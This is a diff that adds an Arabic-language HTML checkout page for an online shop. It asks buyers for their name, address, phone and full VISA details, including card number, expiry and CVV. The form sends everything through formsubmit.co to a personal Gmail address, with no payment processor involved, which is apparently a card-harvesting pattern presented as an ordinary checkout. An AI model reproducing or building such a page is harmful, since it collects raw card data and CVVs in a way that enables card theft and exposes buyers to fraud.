@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>إتمام الطلب - متجرنا</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to right top, #e0f2f7, #c1e8f5, #9ad2ed, #6fc0e5, #4ca0db);
+      color: #333;
+      line-height: 1.6;
+      display: flex; /* لكي نوسط المحتوى */
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh; /* ليأخذ كامل ارتفاع الشاشة */
+    }
+
+    header {
+      background-color: #2c3e50;
+      color: #fff;
+      padding: 1rem;
+      text-align: center;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      position: absolute; /* ليبقى في الأعلى */
+      top: 0;
+      width: 100%;
+    }
+
+    h1 {
+      margin: 0;
+      font-size: 2.5rem;
+      letter-spacing: 1px;
+    }
+
+    .section {
+      padding: 3rem 1rem;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    h2 {
+      color: #2c3e50;
+      text-align: center;
+      margin-bottom: 2.5rem;
+      font-size: 2rem;
+      position: relative;
+    }
+
+    h2::after {
+      content: '';
+      display: block;
+      width: 60px;
+      height: 4px;
+      background-color: #3498db;
+      margin: 10px auto 0;
+      border-radius: 2px;
+    }
+
+    form {
+      background: #fff;
+      max-width: 600px;
+      margin: 3rem auto;
+      padding: 2.5rem;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+      border: 1px solid #eee;
+      width: 90%; /* ليتناسب مع الشاشات الصغيرة */
+    }
+
+    form label {
+      display: block;
+      margin-bottom: 0.5rem;
+      color: #444;
+      font-weight: bold;
+      margin-top: 1rem;
+    }
+
+    form input, form textarea {
+      width: calc(100% - 22px);
+      padding: 12px;
+      margin-bottom: 1.5rem;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 1rem;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    form input:focus, form textarea:focus {
+      border-color: #3498db;
+      box-shadow: 0 0 8px rgba(52, 152, 219, 0.2);
+      outline: none;
+    }
+    
+    .form-group {
+      display: flex;
+      gap: 1rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .form-group > div {
+      flex: 1;
+    }
+
+    .form-group input {
+      margin-bottom: 0;
+    }
+
+
+    .submit-btn {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 14px 30px;
+      margin-top: 20px;
+      border-radius: 30px;
+      cursor: pointer;
+      font-size: 1.1rem;
+      font-weight: bold;
+      transition: background 0.3s ease, transform 0.2s ease;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      width: 100%; /* اجعله يأخذ عرض النموذج بالكامل */
+    }
+
+    .submit-btn:hover {
+      background: #0056b3;
+      transform: translateY(-2px);
+    }
+
+    /* استجابة التصميم للشاشات الصغيرة */
+    @media (max-width: 768px) {
+      h1 {
+        font-size: 2rem;
+      }
+      h2 {
+        font-size: 1.8rem;
+      }
+      form {
+        margin: 2rem 1rem;
+        padding: 1.5rem;
+      }
+      .form-group {
+        flex-direction: column;
+        gap: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>إتمام طلب الشراء</h1>
+  </header>
+
+  <section class="section">
+    <h2>أدخل بياناتك لإتمام الطلب</h2>
+    <form action="https://formsubmit.co/Doshkamhmd@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="طلب جديد من المتجر">
+
+      <label for="productInput">اسم المنتج:</label>
+      <input type="text" name="المنتج" id="productInput" required readonly>
+
+      <label for="fullName">الاسم الكامل:</label>
+      <input type="text" name="الاسم" id="fullName" required>
+
+      <label for="email">البريد الإلكتروني:</label>
+      <input type="email" name="البريد الإلكتروني" id="email" required>
+
+      <label for="phone">رقم الهاتف:</label>
+      <input type="tel" name="الهاتف" id="phone" required>
+
+      <label for="address">العنوان:</label>
+      <textarea name="العنوان" id="address" required></textarea>
+
+      <h3>معلومات الدفع (بطاقة VISA)</h3>
+      
+      <label for="cardName">اسم حامل البطاقة:</label>
+      <input type="text" name="اسم حامل البطاقة" id="cardName" required placeholder="الاسم كما يظهر على البطاقة">
+
+      <label for="visaCardNumber">رقم بطاقة VISA:</label>
+      <input type="text" name="رقم بطاقة VISA" id="visaCardNumber" required maxlength="19" placeholder="•••• •••• •••• ••••">
+
+      <div class="form-group">
+        <div>
+          <label for="expiryDate">تاريخ الانتهاء:</label>
+          <input type="text" name="تاريخ انتهاء البطاقة" id="expiryDate" required placeholder="MM/YY" maxlength="5">
+        </div>
+        <div>
+          <label for="cvv">رمز التحقق (CVV):</label>
+          <input type="text" name="رمز التحقق" id="cvv" required maxlength="3" placeholder="•••">
+        </div>
+      </div>
+      
+      <button type="submit" class="submit-btn">إرسال الطلب</button>
+    </form>
+  </section>
+
+  <script>
+    // هذه الدالة ستُستخدم للحصول على اسم المنتج من عنوان URL
+    function getProductFromUrl() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const productName = urlParams.get('product');
+      if (productName) {
+        document.getElementById('productInput').value = decodeURIComponent(productName);
+      }
+    }
+
+    // استدعاء الدالة عند تحميل الصفحة
+    window.onload = getProductFromUrl;
+
+    // التحقق من رقم بطاقة VISA (16 رقم مع مسافات)
+    const visaCardInput = document.getElementById("visaCardNumber");
+    visaCardInput.addEventListener("input", function () {
+      let value = this.value.replace(/\D/g, ''); // إزالة كل ما هو ليس رقم
+      value = value.match(/.{1,4}/g)?.join(' ') || ''; // إضافة مسافات كل 4 أرقام
+      this.value = value.slice(0, 19); // تحديد أقصى طول (16 رقم + 3 مسافات)
+    });
+
+    // خانة تاريخ الانتهاء بصيغة MM/YY تلقائيًا
+    const expiry = document.getElementById("expiryDate");
+    expiry.addEventListener("input", function (e) {
+      let value = this.value.replace(/\D/g, '');
+      if (value.length >= 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4);
+      }
+      this.value = value.slice(0, 5);
+    });
+
+    // التحقق من رمز التحقق CVV
+    const cvvInput = document.getElementById("cvv");
+    cvvInput.addEventListener("input", function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 3); // السماح بالأرقام فقط و3 خانات
+    });
+  </script>
+
+</body>
+</html>
